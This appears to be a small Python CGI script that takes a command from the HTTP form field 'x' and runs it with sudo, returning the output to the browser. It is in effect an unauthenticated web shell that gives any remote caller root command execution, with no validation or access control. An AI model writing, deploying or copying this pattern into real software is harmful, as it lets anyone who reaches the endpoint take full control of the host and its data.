#!/usr/bin/python3
import cgi
import subprocess

print("content-type: text/html")
print()

form = cgi.FieldStorage()
cmd = form.getvalue("x")

x=subprocess.getoutput("sudo {}".format(cmd))
print(x)
